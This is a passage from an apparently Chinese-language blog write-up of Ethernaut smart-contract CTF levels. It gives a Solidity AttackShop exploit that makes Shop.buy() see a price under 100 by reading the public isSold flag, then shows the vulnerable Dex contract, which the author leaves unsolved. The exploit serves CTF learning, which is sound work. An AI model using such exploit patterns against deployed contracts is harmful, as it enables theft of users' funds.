class="number">3000</span>)();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目要求少于指定价格得到商品，price&lt;100</p>
<p>发现 <code>isSold</code> 是 <code>public</code> 属性，所以可以利用 <code>isSold</code> ，根据 <code>isSold</code> 进行判断，两次调用 <code>_buyer.price.gas(3000)()</code> 第一次返回大于等于 <code>100</code> ，第二次返回小于 <code>100</code> 即可</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract AttackShop &#123;</span><br><span class="line">    </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;  </span><br><span class="line"></span><br><span class="line">        assembly &#123;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">// Call Shop.buy()</span></span><br><span class="line">            mstore(<span class="number">0x20</span>, <span class="number">0xa6f2ae3a00000000000000000000000000000000000000000000000000000000</span>) <span class="comment">/* selector(buy()) */</span></span><br><span class="line">            <span class="keyword">let</span> success := call(<span class="number">100000</span>, <span class="number">0x81204a9d43123Df65D6089f4bF7493E43c1868b9</span>, <span class="number">0</span>, <span class="number">0x20</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="function"><span class="title">iszero</span>(<span class="params">success</span>)</span> &#123;</span><br><span class="line">                revert(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>(<span class="number">0</span>, <span class="number">0x0</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">         </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210626174120276-7093025.png" alt="image-20210626174120276"></p>
<h2 id="0x17-Dex"><a href="#0x17-Dex" class="headerlink" title="0x17 Dex"></a>0x17 Dex</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract Dex  &#123;</span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint;</span><br><span class="line">  address public token1;</span><br><span class="line">  address public token2;</span><br><span class="line">  <span class="title">constructor</span>(<span class="params">address _token1, address _token2</span>) <span class="title">public</span> &#123;</span><br><span class="line">    token1 = _token1;</span><br><span class="line">    token2 = _token2;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">swap</span>(<span class="params">address <span class="keyword">from</span>, address to, uint amount</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(IERC20(<span class="keyword">from</span>).balanceOf(msg.sender) &gt;= amount, <span class="string">&quot;Not enough to swap&quot;</span>);</span><br><span class="line">    uint swap_amount = get_swap_price(<span class="keyword">from</span>, to, amount);</span><br><span class="line">    IERC20(<span class="keyword">from</span>).transferFrom(msg.sender, address(<span class="built_in">this</span>), amount);</span><br><span class="line">    IERC20(to).approve(address(<span class="built_in">this</span>), swap_amount);</span><br><span class="line">    IERC20(to).transferFrom(address(<span class="built_in">this</span>), msg.sender, swap_amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">add_liquidity</span>(<span class="params">address token_address, uint amount</span>) <span class="title">public</span></span>&#123;</span><br><span class="line">    IERC20(token_address).transferFrom(msg.sender, address(<span class="built_in">this</span>), amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">get_swap_price</span>(<span class="params">address <span class="keyword">from</span>, address to, uint amount</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span>(<span class="params">uint</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span>((amount * IERC20(to).balanceOf(address(<span class="built_in">this</span>)))/IERC20(<span class="keyword">from</span>).balanceOf(address(<span class="built_in">this</span>)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">approve</span>(<span class="params">address spender, uint amount</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    SwappableToken(token1).approve(msg.sender, spender, amount);</span><br><span class="line">    SwappableToken(token2).approve(msg.sender, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address token, address account</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> IERC20(token).balanceOf(account);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableToken is ERC20 &#123;</span><br><span class="line">  <span class="title">constructor</span>(<span class="params">string memory name, string memory symbol, uint initialSupply</span>) <span class="title">public</span> <span class="title">ERC20</span>(<span class="params">name, symbol</span>) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">approve</span>(<span class="params">address owner, address spender, uint amount</span>) <span class="title">public</span> <span class="title">returns</span>(<span class="params">bool</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>._approve(owner, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对不起这道题还得做一段时间，如果做出来了再更新吧</p>

    </div>

    
    
    

    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>Zpano
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://zpano.cn/2021/06/17/16/" title="Ethernaut wp">https://zpano.cn/2021/06/17/16/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/" rel="tag"># 区块链安全</a>
              <a href="/tags/CTF/" rel="tag"># CTF</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2021/06/07/15/" rel="prev" title="区块链整数溢出漏洞">
                  <i class="fa fa-chevron-left"></i> 区块链整数溢出漏洞
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2021/06/30/18/" rel="next" title="区块链面试总结">
                  区块链面试总结 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






      

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      const commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

    </div>
  </main>

  <footer class="footer">
    <div class="footer-inner">
      

      

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Zpano</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">222k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">3:22</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>

    </div>
  </footer>

  
  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  




  <script src="/js/local-search.js"></script>















  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>








  

  
      <script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              const target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    const script = document.createElement('script');
    script.src = '//cdn.jsdelivr.net/npm/mathjax@3.1.2/es5/tex-mml-chtml.js';
    script.defer = true;
    document.head.appendChild(script);
  } else {
    MathJax.startup.document.state(0);
    MathJax.typesetClear();
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

</body>
</html>
